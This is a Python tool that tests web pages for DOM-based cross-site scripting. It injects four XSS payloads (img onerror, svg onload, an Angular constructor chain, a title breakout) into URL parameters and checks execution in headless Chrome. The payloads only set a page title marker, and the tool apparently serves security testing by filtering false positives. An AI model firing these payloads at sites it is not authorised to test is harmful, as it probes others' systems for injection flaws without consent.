#!/usr/bin/env python3
"""Strict DOM-XSS verifier using headless Chrome `--dump-dom`.

Why this exists: the usual "marker appears in the dumped DOM" check produces false
positives two ways — (1) analytics pixels (VWO/AdRoll/GTM/Facebook) copy the whole
current URL into tracking-pixel `src` attributes, and (2) search templates echo the
payload text into <title>. Both put the marker in the DOM with zero execution.

This harness only counts a hit when:
  * document.title EQUALS the bare marker (not "contains"), OR
  * the DOM contains the exact payload-owned node id.

Requires google-chrome/chromium on PATH. No playwright/marionette needed.

Usage:
  python3 dom_xss_dumpdom.py targets.txt          # lines: URL|param
  python3 dom_xss_dumpdom.py --single 'https://t/p?q='
  # a bare URL is treated as the injection prefix; the payload is appended.

Targets file format (one per line):
  https://target/search|q
  https://target/page?x=1|utm_source
  https://target/#            (payload appended directly, for fragments)
"""
import subprocess, sys, shutil, re, urllib.parse, json

MARK = "xssmrk987"
PAYLOADS = {
    "dq":   '"><img src=x id="xssm987" onerror="document.title=\'XSSMRK_dq\'">',
    "svg":  '"><svg/onload="document.title=\'XSSMRK_svg\'">',
    "ang":  '{{constructor.constructor("document.title=\'XSSMRK_ang\'")()}}',
    "brk":  '</title><svg onload="document.title=\'XSSMRK_brk\'">',
}
FLAGS = ["--headless=new", "--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage",
         "--virtual-time-budget=9000", "--timeout=25000", "--dump-dom", "--log-level=3"]


def chrome():
    for b in ("google-chrome", "chromium", "chromium-browser"):
        p = shutil.which(b)
        if p:
            return p
    sys.exit("no chrome/chromium on PATH")


BIN = chrome()


def dump(url):
    try:
        r = subprocess.run([BIN] + FLAGS + [url], capture_output=True, text=True, timeout=50)
        return r.stdout or ""
    except subprocess.TimeoutExpired:
        return ""


def verdict(dom, marker):
    """Strict: title must EQUAL the bare marker; or the exact element id must exist."""
    m = re.search(r"<title>([^<]*)</title>", dom)
    title = (m.group(1) if m else "").strip()
    exec_title = title == marker                      # equality, never substring
    node = 'id="xssm987"' in dom                      # exact attribute, not substring of outerHTML
    return bool(exec_title or node), title, node


def main():
    if len(sys.argv) < 2:
        sys.exit(__doc__)
    if sys.argv[1] == "--single":
        targets = [sys.argv[2]]
        if "|" not in targets[0] and "?" not in targets[0] and "#" not in targets[0]:
            targets[0] += "|q"
    else:
        targets = [l.strip() for l in open(sys.argv[1]) if l.strip() and not l.startswith("#")]

    hits, rows = [], []
    for t in targets:
        base, _, param = t.partition("|")
        for name, payload in PAYLOADS.items():
            marker = "XSSMRK_" + name
            if param:
                sep = "&" if "?" in base else "?"
                url = f"{base}{sep}{urllib.parse.quote(param)}=" + urllib.parse.quote(payload, safe="")
            else:
                url = base + urllib.parse.quote(payload, safe="")
            dom = dump(url)
            ok, title, node = verdict(dom, marker)
            rows.append({"url": url, "payload": name, "executed": ok, "title": title[:120], "node": node})
            print(f"{'EXECUTED' if ok else 'no      '} node={'Y' if node else 'n'} {name:4s} {url[:110]}")
            if ok:
                hits.append(url)

    json.dump(rows, open("dom_xss_dumpdom.json", "w"), indent=1)
    print(f"\n{len(rows)} runs, {len(hits)} executed")
    for h in hits:
        print("  HIT:", h)
    if not hits:
        print("clean negative — publishable alongside the emission-form classification")


if __name__ == "__main__":
    main()
